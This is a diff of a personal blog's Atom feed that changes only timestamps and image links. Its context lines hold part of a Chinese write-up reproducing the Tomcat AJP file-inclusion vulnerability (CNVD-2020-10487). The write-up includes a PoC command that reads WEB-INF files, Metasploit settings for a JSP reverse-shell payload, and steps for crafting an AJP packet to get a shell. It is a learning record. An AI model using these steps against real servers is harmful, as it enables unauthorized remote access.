@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://guy-Fawke.github.io</id>
     <title>Guy-fawke&apos;s  warehouse</title>
-    <updated>2020-03-28T07:26:19.534Z</updated>
+    <updated>2020-03-28T07:31:02.498Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://guy-Fawke.github.io"/>
     <link rel="self" href="https://guy-Fawke.github.io/atom.xml"/>
@@ -22,7 +22,7 @@
 <pre><code class="language-shell">python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f &quot;/WEB-INF/web.hml&quot; 192.168.0.1
 </code></pre>
 <p>-p &lt;端口&gt; -f&lt;文件路径&gt; <IP>，这里应为该漏洞的原因，AJP协议所使用的是8009端口，所以是固定值，只需要对其他两个参数进行修改即可，输入“-h”可以查看该POC的帮助信息，大佬果然还是想的全面的。</p>
-<figure data-type="image" tabindex="1"><img src="https://guy-Fawke.github.io/post-images/1585379706073.png" alt="命令执行结果" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://guy-Fawke.github.io/post-images/1585380602613.png" alt="" loading="lazy"></figure>
 <h2 id="二-命令执行">二、命令执行</h2>
 <p>这里我采用的方式是使用msf生成反弹马，简洁又方便~~（其实是我只会这个）~~。</p>
 <h5 id="1使用msf生成反弹shell马">1.使用msf生成反弹shell马</h5>
@@ -38,7 +38,7 @@ set LPORT 9999
 set payload java/jsp_shell_reverse_tcp
 show options
 </code></pre>
-<p><img src="https://guy-Fawke.github.io/post-images/1585379796204.png" alt="" loading="lazy"><br>
+<p><img src="https://guy-Fawke.github.io/post-images/1585380619907.png" alt="" loading="lazy"><br>
 先选择我们使用的模块，然后设定监听的IP和端口，选择我们的payload，最后查看一下设置，是我个人习惯，毕竟确定一下不是什么坏事。这里就等待执行就可以了。</p>
 <h5 id="3构造ajp包">3.构造AJP包</h5>
 <p>这里也是今天才学会的，用到的是AJP包构造器<a href="https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar">ajpfuzzer</a>。</p>
@@ -55,13 +55,13 @@ show options
 </code></pre>
 </li>
 </ol>
-<figure data-type="image" tabindex="2"><img src="https://guy-Fawke.github.io/post-images/1585379894316.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://guy-Fawke.github.io/post-images/1585380632264.png" alt="" loading="lazy"></figure>
 <p>指令中“/123.jsp”是一个该web项目中没有的jsp文件，这样tomcat才会去调用存在漏洞的地方，&quot;/WEB-INF/shell.png&quot;为自己的马上传的文件路径。</p>
 <h5 id="4得到shell">4.得到shell</h5>
 <p>都已经准备完毕了，享受最后成果：运行msf开始监听，然后发送之前构造好的包，即可得到shell。<br>
-<img src="https://guy-Fawke.github.io/post-images/1585379973586.png" alt="" loading="lazy"><br>
+<img src="https://guy-Fawke.github.io/post-images/1585380647401.png" alt="" loading="lazy"><br>
 这里收到连接之后由于太久没用，傻掉了，连接回来之后是可以进行下一步操作的，我这里等到连接都断开了还以为没连接成功 = =，尴尬，第二次连接回来才想起来用shell命令。<br>
-<img src="https://guy-Fawke.github.io/post-images/1585379982900.png" alt="" loading="lazy"></p>
+<img src="https://guy-Fawke.github.io/post-images/1585380657112.png" alt="" loading="lazy"></p>
 <h2 id="总结">总结</h2>
 <p>总的来说，这次是第一次尝试复现CVE漏洞，一是因为一个好的机遇遇到了能做题的环境，二是关注到了最近所爆出的大型漏洞，所以第一时间想到了。感觉还是比较舒服的，也挺有成就感的，所以这里专门记录了下来，美中不足的是这次没有尝试提权。希望在之后的学习过程中，自己能够看懂这个漏洞产生的原因，以及写出自己的POC，能够自己独立完成一系列工作。</p>
 ]]></content>
